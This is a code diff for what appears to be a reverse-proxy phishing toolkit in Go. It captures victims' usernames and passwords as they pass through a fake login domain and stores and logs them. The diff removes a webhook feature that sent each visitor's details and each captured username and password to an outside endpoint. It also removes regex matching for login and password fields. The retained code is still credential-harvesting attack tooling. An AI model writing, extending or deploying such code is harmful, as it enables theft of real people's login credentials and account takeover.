@@ -47,7 +47,6 @@ import (
 const (
 	CONVERT_TO_ORIGINAL_URLS = 0
 	CONVERT_TO_PHISHING_URLS = 1
-	webhook_verbosity        = 2
 )
 
 const (
@@ -90,10 +89,6 @@ type ProxySession struct {
 	PhishDomain  string
 	PhishletName string
 	Index        int
-}
-
-type data struct {
-	Fai string `json:"as"`
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -292,7 +287,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									p.NotifyWebhook(fmt.Sprintf("[%d] new visitor has arrived: %s (%s)", sid, req.Header.Get("User-Agent"), remote_addr))
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
@@ -555,9 +549,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
-									if len(um[1]) > 0 && webhook_verbosity == 2 {
-										p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
-									}
 								}
 							}
 
@@ -568,9 +559,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
-									}
-									if len(pm[1]) > 0 && webhook_verbosity == 2 {
-										p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
 									}
 								}
 							}
@@ -583,21 +571,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
-										}
-										if cp.key_s == "(login|UserName|username|email|account)" {
-											log.Success("[%d] Username: [%s]", ps.Index, cm[1])
-											p.setSessionUsername(ps.SessionId, cm[1])
-											if len(cm[1]) > 0 && webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, cm[1]))
-											}
-										} else if cp.key_s == "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)" {
-											p.setSessionPassword(ps.SessionId, cm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, cm[1])
-											if len(cm[1]) > 0 && webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, cm[1]))
-											}
-										} else {
-											log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										}
 									}
 								}
@@ -619,9 +592,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if len(um[1]) > 0 && webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
-											}
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -631,9 +601,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
-											}
-											if len(pm[1]) > 0 && webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
 											}
 										}
 									}
@@ -645,21 +612,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
-												}
-												if cp.key_s == "(login|UserName|username|email|account)" {
-													log.Success("[%d] Username: [%s]", ps.Index, cm[1])
-													p.setSessionUsername(ps.SessionId, cm[1])
-													if len(cm[1]) > 0 && webhook_verbosity == 2 {
-														p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, cm[1]))
-													}
-												} else if cp.key_s == "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)" {
-													p.setSessionPassword(ps.SessionId, cm[1])
-													log.Success("[%d] Password: [%s]", ps.Index, cm[1])
-													if len(cm[1]) > 0 && webhook_verbosity == 2 {
-														p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, cm[1]))
-													}
-												} else {
-													log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												}
 											}
 										}
